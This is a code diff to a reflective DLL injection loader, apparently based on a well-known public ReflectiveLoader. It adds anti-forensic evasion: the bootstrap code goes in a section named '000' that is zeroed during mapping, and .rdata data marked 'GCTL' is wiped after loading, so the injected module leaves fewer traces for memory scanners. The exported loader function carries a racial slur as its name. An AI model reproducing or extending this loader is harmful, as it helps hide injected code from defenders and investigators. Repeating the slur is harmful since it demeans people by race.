@@ -4,7 +4,6 @@
 
 #include "stdafx.h"
 
-
 // Our loader will set this to a pseudo correct HINSTANCE/HMODULE value
 HINSTANCE hAppInstance = NULL;
 //===============================================================================================//
@@ -13,6 +12,7 @@ HINSTANCE hAppInstance = NULL;
 // this code will be compiled with the /O2 and /Ob1 switches. Bonus points if we could take advantage of 
 // RIP relative addressing in this instance but I dont believe we can do so with the compiler intrinsics 
 // available (and no inline asm available under x64).
+#pragma code_seg("000")  
 __declspec(noinline) ULONG_PTR caller(VOID) { return (ULONG_PTR)_ReturnAddress(); }
 
 
@@ -20,6 +20,7 @@ __declspec(noinline) ULONG_PTR caller(VOID) { return (ULONG_PTR)_ReturnAddress()
 
 
 #ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
+#pragma code_seg("000")  
 DLLEXPORT NTSTATUS NTAPI add(PCONTEXT ctx, BOOL Alertable)
 #else
 DLLEXPORT ULONG_PTR WINAPI NiggerLoader(VOID)
@@ -285,9 +286,12 @@ DLLEXPORT ULONG_PTR WINAPI NiggerLoader(VOID)
 
 	// itterate through all sections, loading them into memory.
 	uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
+	BYTE* removeStart;
+	DWORD removeLength;
 	while (uiValueE--)
 	{
 		// uiValueB is the VA for this section
+		
 		uiValueB = (uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress);
 
 		// uiValueC if the VA for this sections data
@@ -295,7 +299,46 @@ DLLEXPORT ULONG_PTR WINAPI NiggerLoader(VOID)
 
 		// copy the section over
 		uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;
+		if (
+			((PIMAGE_SECTION_HEADER)uiValueA)->Name[0] == '0'
+			&&
+			((PIMAGE_SECTION_HEADER)uiValueA)->Name[1] == '0'
+			&&
+			((PIMAGE_SECTION_HEADER)uiValueA)->Name[2] == '0'
+			)
+			*(BYTE *)uiValueB++ = 0;
+		else if (((PIMAGE_SECTION_HEADER)uiValueA)->Name[0] == '.'
+			&&
+			((PIMAGE_SECTION_HEADER)uiValueA)->Name[1] == 'r'
+			&&
+			((PIMAGE_SECTION_HEADER)uiValueA)->Name[2] == 'd'
+			&&
+			((PIMAGE_SECTION_HEADER)uiValueA)->Name[3] == 'a'
+			&&
+			((PIMAGE_SECTION_HEADER)uiValueA)->Name[4] == 't'
+			&&
+			((PIMAGE_SECTION_HEADER)uiValueA)->Name[5] == 'a')
+{
 
+			while (uiValueD--) {
+
+				if (((BYTE *)(uiValueC))[0] == 'G'
+					&&
+					((BYTE *)(uiValueC))[1] == 'C'
+					&&
+					((BYTE *)(uiValueC))[2] == 'T'
+					&&
+					((BYTE *)(uiValueC))[3] == 'L') {
+					removeStart = (BYTE*)uiValueB;
+					removeLength = uiValueD - 1;
+
+				}
+
+					*(BYTE *)uiValueB++ = *(BYTE *)uiValueC++;
+			}
+			
+		}
+		else
 		while (uiValueD--)
 			*(BYTE *)uiValueB++ = *(BYTE *)uiValueC++;
 
@@ -373,7 +416,7 @@ DLLEXPORT ULONG_PTR WINAPI NiggerLoader(VOID)
 
 	// uiValueB = the address of the relocation directory
 	uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-
+	
 	// check if their are any relocations present
 	if (((PIMAGE_DATA_DIRECTORY)uiValueB)->Size)
 	{
@@ -460,6 +503,8 @@ DLLEXPORT ULONG_PTR WINAPI NiggerLoader(VOID)
 		*(unsigned long long*)(uiBaseAddress + i) = 0;
 
 	pNtFlushInstructionCache((HANDLE)-1, NULL, 0);
+	while (removeLength--) 
+		*removeStart++ = 0;
 
 	// call our respective entry point, fudging our hInstance value
 #ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
